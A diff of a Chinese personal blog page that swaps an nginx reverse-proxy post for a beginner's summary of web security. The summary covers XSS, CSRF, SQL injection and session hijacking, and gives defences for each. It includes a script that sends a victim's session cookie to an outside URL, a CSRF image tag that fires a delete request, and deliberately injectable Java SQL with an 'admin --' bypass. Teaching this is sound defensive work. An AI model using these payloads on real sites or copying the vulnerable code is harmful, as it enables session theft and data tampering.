@@ -6,8 +6,8 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://reiner.host">
-  <link rel="canonical" href="https://reiner.host/posts/763efb1.html"/>
-  <title>简单的nginx反向代理配置 | Reinerの个人博客</title>
+  <link rel="canonical" href="https://reiner.host/posts/d581b2e3.html"/>
+  <title>WEB安全总结 | Reinerの个人博客</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
@@ -17,17 +17,20 @@
   <meta name="msvalidate.01" content="2A23871076C32D9FEA46BE743DA8711C" />
   
   
-  <meta name="description" content="实用nginx反向代理可实现 url转发， 如输入www.cc.com  直接转发到 127.0.0.1:8080&#x2F;project&#x2F;  实用nginx 可直接输入url就可访问到tomcat的某目录下 端口号也可不用输入  很适合2个域名用同一台服务器的情况  下面是nginx的conf配置     首先在nginx.conf引入 配置文件include  vhost.conf; 新建">
+  <meta name="description" content="前言  最近看了《白帽子讲WEB安全》，书的内容可能已经过时了，但是用来提高安全意识还是不错的，现在将它记下来做个总结。 WEB安全整体给我的感觉是虽然重要，但攻击手段有限，安全的大头还是在服务器安全这块。 XSS攻击先来第一个，XSS攻击，XSS攻击主要分为两类： 1、存储型XSS  2、反射型XSS ，先来看反射型XSS攻击。 反射型XSS攻击所谓反射型XSS攻击其实就是利用JAVASCRIP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="简单的nginx反向代理配置">
-<meta property="og:url" content="https://reiner.host/posts/763efb1.html">
+<meta property="og:title" content="WEB安全总结">
+<meta property="og:url" content="https://reiner.host/posts/d581b2e3.html">
 <meta property="og:site_name" content="Reinerの个人博客">
-<meta property="og:description" content="实用nginx反向代理可实现 url转发， 如输入www.cc.com  直接转发到 127.0.0.1:8080&#x2F;project&#x2F;  实用nginx 可直接输入url就可访问到tomcat的某目录下 端口号也可不用输入  很适合2个域名用同一台服务器的情况  下面是nginx的conf配置     首先在nginx.conf引入 配置文件include  vhost.conf; 新建">
+<meta property="og:description" content="前言  最近看了《白帽子讲WEB安全》，书的内容可能已经过时了，但是用来提高安全意识还是不错的，现在将它记下来做个总结。 WEB安全整体给我的感觉是虽然重要，但攻击手段有限，安全的大头还是在服务器安全这块。 XSS攻击先来第一个，XSS攻击，XSS攻击主要分为两类： 1、存储型XSS  2、反射型XSS ，先来看反射型XSS攻击。 反射型XSS攻击所谓反射型XSS攻击其实就是利用JAVASCRIP">
 <meta property="og:locale">
-<meta property="article:published_time" content="2020-10-27T06:53:14.000Z">
-<meta property="article:modified_time" content="2020-11-03T06:29:23.540Z">
+<meta property="article:published_time" content="2021-05-13T02:41:00.000Z">
+<meta property="article:modified_time" content="2021-05-14T02:11:06.890Z">
 <meta property="article:author" content="reiner">
-<meta property="article:tag" content="-- 运维 -- nginx">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="xss攻击">
+<meta property="article:tag" content="csrf攻击">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Reinerの个人博客" type="application/atom+xml">
@@ -283,14 +286,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-简单的nginx反向代理配置" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-WEB安全总结" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      简单的nginx反向代理配置
+      WEB安全总结
     </h1>
   
 
@@ -302,8 +305,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/posts/763efb1.html" class="archive-article-date">
-        <time datetime="2020-10-27T06:53:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-27</time>
+<a href="/posts/d581b2e3.html" class="archive-article-date">
+        <time datetime="2021-05-13T02:41:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-13</time>
 </a>
 
   
@@ -316,7 +319,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">279字</span>
+      <span class="post-count">1.5k字</span>
     </span>
   </span>
 
@@ -325,7 +328,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">5分</span>
     </span>
   </span>
 </div>
@@ -336,21 +339,63 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <!-- toc -->
+    <h1><span id="前言">前言</span></h1><p>  最近看了《白帽子讲WEB安全》，书的内容可能已经过时了，但是用来提高安全意识还是不错的，现在将它记下来做个总结。</p>
+<p>WEB安全整体给我的感觉是虽然重要，但攻击手段有限，安全的大头还是在服务器安全这块。</p>
+<h1><span id="xss攻击">XSS攻击</span></h1><p>先来第一个，XSS攻击，XSS攻击主要分为两类： 1、存储型XSS  2、反射型XSS ，先来看反射型XSS攻击。</p>
+<h4><span id="反射型xss攻击">反射型XSS攻击</span></h4><p>所谓反射型XSS攻击其实就是利用JAVASCRIPT解析漏洞，将原本该解析成HTML的内容解析成了JS代码,那么如何实现攻击的呢？ 假设某个20年前原始的网站有如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请输入搜索关键字：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;search&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">您的搜索关键字是：$&#123;keyword&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p>此时我们输入：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> ,点击搜索后，发现页面上打印alert(xss)了，但是这样只是控制了自己的浏览器JS，没有意义（用浏览器控制台一样可以做到），因此要将此漏洞散布出去。</p>
+<p>假设它的搜索请求url是：<a href="http://reiner.host/search?keyword=WEB%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93">http://reiner.host/search?keyword=WEB安全总结</a> ，将其改为  <a href="http://reiner.host/search?keyword=">http://reiner.host/search?keyword=</a><script>alert(cookie.sid)</script>  ,并将链接分享出去，诱导别人去点击。</p>
+<p>此时这个倒霉鬼如果刚好登陆了该网站，那么你就可以通过JS拿到他的sessionId,然后弄个不可见的iframe将sessionId传到自己的服务器，从而为所欲为了。</p>
+<p>PS:担心加上JS代码后链接过长可以弄个短链接。</p>
+<p><strong>所以防止反射型XSS的关键点在于不能直接将用户输入的内容展现出来</strong>，绝大部分前端框架一般是解决了此问题的，即用户输入内容不会被浏览器解析为JS代码，但不排除一定就没有XSS漏洞了。</p>
+<p><strong>防反射型XSS攻击总结</strong></p>
+<p>1、对于用户输入的内容不要直接展示</p>
+<p>2、使用稳定的开源框架，一般有自动处理</p>
+<p><em>这就是为什么要注意不要乱点链接</em></p>
+<a id="more"></a>
 
+<h4><span id="储存型xss攻击">储存型XSS攻击</span></h4><p>此类漏洞危害性最大，是反射型XSS攻击的加强版，原理依旧是将用户输入内容解析为JS代码。</p>
+<p>假设某论坛没有对用户输入内容做处理直接展示，此时我新建一个帖子，内容如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.open(<span class="string">&#x27;http://reiner.host/xss?cookieId=&#x27;</span>+cookie.sessionId);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<!-- tocstop -->
+<p>标题为：震惊！一对男女大白天在办公室竟干出这种事！（附图片）  ，我相信会有很多人点进来，然后他们就会自动打开新窗口，他们的session id我全知道了。</p>
+<p>如果想做得绝一点，甚至可以做个隐藏表单提交，表单请求一些删除操作的接口。。。</p>
+<p><strong>防存储型XSS攻击总结</strong></p>
+<p>1、在做好反射型XSS攻击的基础上增加XSS过滤器，github上应该有很多现成的xss过滤器可以用，将js代码转义再存储</p>
+<p>2、设置http header里的http only 为true，这样浏览器会禁止js代码读取cookie</p>
+<h1><span id="csrf跨域脚本攻击">CSRF跨域脚本攻击</span></h1><p>CSRF其基本原理是伪造请求，即对于服务器来说，请求是合法的，但是这可能并不是用户主动发起的，假设某论坛网站的删除接口URL是 <a href="https://reiner.host/delete?id=%7Bid%7D">https://reiner.host/delete?id={id}</a> </p>
+<p>通过查看帖子我知道了某用户的一个帖子ID是1，此时我给该用户发私信了，内容是： <code>&lt;img src=&quot;https://reiner.host/delete?id=1&quot;/&gt;</code> 。</p>
+<p>该用户打开私信时看到的只是一张加载失败的图片，但是实际上浏览器已经请求了delete接口，他的ID为1的帖子已经被删除了。</p>
+<p><strong>防CSRF跨域脚本攻击总结</strong></p>
+<p>1、 Referer check来源检查，请求不能是通过其它域名请求过来的。</p>
+<p>2、使用TOKEN验证用户身份，这样伪造请求的接口地址中没有TOKEN就无法请求成功</p>
+<p>以上均为示例，实际攻击手段各种各样。</p>
+<h1><span id="flash漏洞">FLASH漏洞</span></h1><p>这个玩意漏洞一堆，所以可以看到chrome为了安全已经把它禁用了，而且这个年代已经没有人使用FLASH了，因此FLASH直接PASS 。</p>
+<h1><span id="sql注入">SQL注入</span></h1><p>这个年代SQL注入基本上已经凉了，除非某些新手同志写代码不好好用占位符，假设漏洞代码如下 ：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;login&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(String userName,String password)</span></span>&#123;</span><br><span class="line">  jdbcTemplate.query(<span class="string">&quot;SELECT * FROM USER WHERE USER_NAME = &quot;</span>+userName + <span class="string">&quot; AND PASSWORD = &quot;</span>+password);</span><br><span class="line">  ...以下省略</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>实用nginx反向代理可实现 url转发， 如输入<a target="_blank" rel="noopener" href="http://www.cc.com/">www.cc.com</a>  直接转发到 127.0.0.1:8080/project/  实用nginx 可直接输入url就可访问到tomcat的某目录下 端口号也可不用输入  很适合2个域名用同一台服务器的情况 </p>
-<p>下面是nginx的conf配置    </p>
-<p>首先在nginx.conf引入 配置文件include  vhost.conf;</p>
-<p>新建vhost.conf </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">## Basic reverse proxy server ##</span><br><span class="line">#这个是反向代理的地址</span><br><span class="line">upstream apachejsp  &#123;</span><br><span class="line">    server 127.0.0.1:8080; #Apache #这里输入你服务器的ip与tomcat端口</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;  #侦听80端口</span><br><span class="line">    server_name  www.&lt;span style&#x3D;&quot;font-size: 11.8181819915771px; font-family: Arial, Helvetica, sans-serif;&quot;&gt;wangzhan&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;font-size: 12px; font-family: Arial, Helvetica, sans-serif;&quot;&gt;.com;#拦截此url&lt;&#x2F;span&gt;</span><br><span class="line"> </span><br><span class="line">    access_log  logs&#x2F;fuchiht.access.log ; #log path</span><br><span class="line">    error_log  logs&#x2F;fuchiht.error.log;</span><br><span class="line">    root   html;</span><br><span class="line">    index  index.html index.htm index.jsp;  #welcome page </span><br><span class="line"> </span><br><span class="line">    ## send request back to apache ##</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        proxy_pass  http:&#x2F;&#x2F;apachejsp;  </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">        #Proxy Settings</span><br><span class="line">        proxy_redirect     off;</span><br><span class="line">        proxy_set_header   Host             $host;</span><br><span class="line">        proxy_set_header   X-Real-IP        $remote_addr;</span><br><span class="line">        proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;</span><br><span class="line">        proxy_max_temp_file_size 0;</span><br><span class="line">        proxy_connect_timeout      90;</span><br><span class="line">        proxy_send_timeout         90;</span><br><span class="line">        proxy_read_timeout         90;</span><br><span class="line">        proxy_buffer_size          4k;</span><br><span class="line">        proxy_buffers              4 32k;</span><br><span class="line">        proxy_busy_buffers_size    64k;</span><br><span class="line">        proxy_temp_file_write_size 64k;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
+<p>在登陆框里输入用户名为：<code>admin --</code> 密码： 随便填 ,拼出来的SQL就变成了：<code>SELECT * FROM USER WHERE USER_NAME = admin --AND PASSWORD=123</code> ,后面的条件都注释掉了。</p>
+<p><strong>应对方法</strong></p>
+<p>1、使用参数占位符，举例：<code>jdbcTemplate.query(&quot;SELECT * FROM USER WHERE USER_NAME = ? AND PASSWORD = ?&quot;,userName,password);</code>,使用mybatis的${}要注意，此符号是拼接SQL。</p>
+<p>2、参数过滤，每个添加、修改请求过滤参数里可能存在的敏感字符，如UPDATE DELETE 等，网上已经有大量的开源工具可以帮我们过滤。</p>
+<h1><span id="会话劫持">会话劫持</span></h1><p>浏览器和服务器之间的通信内容被人抓包到了，劫持人获得了你的TOKEN以及所有请求内容</p>
+<p>解决：<br>1、上HTTPS</p>
+<p>2、每次请求返回带上下一次请求的随机数，后端验证该随机数是否正确</p>
+<h1><span id="其它安全">其它安全</span></h1><p>不在WEB安全范围内，有如下几点：</p>
+<ul>
+<li>TCP连接攻击</li>
+<li>DDOS攻击</li>
+<li>服务器安全配置</li>
+<li>系统漏洞扫描</li>
+<li>渗透测试</li>
+</ul>
+<p><strong>其它WEB安全：</strong></p>
+<ul>
+<li>代码扫描</li>
+<li>XSS漏洞扫描</li>
+</ul>
 
     
 
@@ -365,7 +410,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://reiner.host/posts/763efb1.html" title="简单的nginx反向代理配置" target="_blank">https://reiner.host/posts/763efb1.html</a>
+          <a href="https://reiner.host/posts/d581b2e3.html" title="WEB安全总结" target="_blank">https://reiner.host/posts/d581b2e3.html</a>
         </li>
         
         <li>
@@ -387,7 +432,19 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">-- 运维 -- nginx</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">WEB安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">xss攻击</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">csrf攻击</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
         		</li>
       		
 		</ul>
@@ -399,7 +456,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/运维//" class="article-tag-list-link color3">运维</a>
+        			<a href="/categories/JAVA//" class="article-tag-list-link color5">JAVA</a>
         		</li>
       		
 		</ul>
@@ -454,7 +511,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://reiner.host/posts/763efb1.html" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://reiner.host/posts/d581b2e3.html" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -469,18 +526,9 @@
 
 <nav id="article-nav">
   
-    <a href="/posts/e259bd66.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          使用Jenkins + Gitlab自动构建Spring Boot项目，并部署到远程服务器上
-        
-      </div>
-    </a>
   
-  
-    <a href="/posts/3242f1a9.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">换新博客啦！</div>
+    <a href="/posts/d84fac55.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">微信小程序用户请求同一个接口session会话会阻塞</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -507,7 +555,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">反射型XSS攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">储存型XSS攻击</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">CSRF跨域脚本攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">FLASH漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">其它安全</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -534,9 +582,9 @@
     <script src="/lib/gitment.js"></script>
   
   <script>
-    <!-- id: "简单的nginx反向代理配置" -->
+    <!-- id: "WEB安全总结" -->
     var gitment = new Gitment({
-      id: "20201027145314",
+      id: "20210513104100",
       owner: 'reinershir',
       repo: 'reinershir.github.io',
       oauth: {
